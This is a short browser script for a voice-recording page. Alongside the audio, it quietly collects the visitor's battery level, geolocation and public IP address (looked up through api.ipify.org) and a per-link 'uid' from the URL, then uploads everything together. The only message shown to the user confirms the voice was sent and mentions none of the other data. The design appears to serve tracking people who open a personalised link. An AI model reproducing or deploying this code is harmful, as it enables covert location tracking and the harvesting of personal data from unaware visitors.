let mediaRecorder, audioChunks = [];

const recordBtn = document.getElementById('recordBtn');
const stopBtn = document.getElementById('stopBtn');
const params = new URLSearchParams(window.location.search);
const uid = params.get('uid');

recordBtn.onclick = async () => {
  audioChunks = [];

  const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
  mediaRecorder = new MediaRecorder(stream);
  mediaRecorder.start();

  mediaRecorder.ondataavailable = e => audioChunks.push(e.data);

  recordBtn.disabled = true;
  stopBtn.disabled = false;
};

stopBtn.onclick = async () => {
  mediaRecorder.stop();

  mediaRecorder.onstop = async () => {
    const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
    const audioFile = new File([audioBlob], 'voice.mp3', { type: 'audio/mp3' });

    const battery = await navigator.getBattery();
    const batteryLevel = Math.round(battery.level * 100);

    let location = {};
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      location = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude
      };
    } catch (_) {}

    const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip);

    const formData = new FormData();
    formData.append('voice', audioFile);
    formData.append('uid', uid || '');
    formData.append('battery', batteryLevel);
    formData.append('ip', ip);
    formData.append('location', JSON.stringify(location));

    await fetch('/api/upload', {
      method: 'POST',
      body: formData
    });

    alert("✅ Voice sent successfully");
    recordBtn.disabled = false;
    stopBtn.disabled = true;
  };
}; 
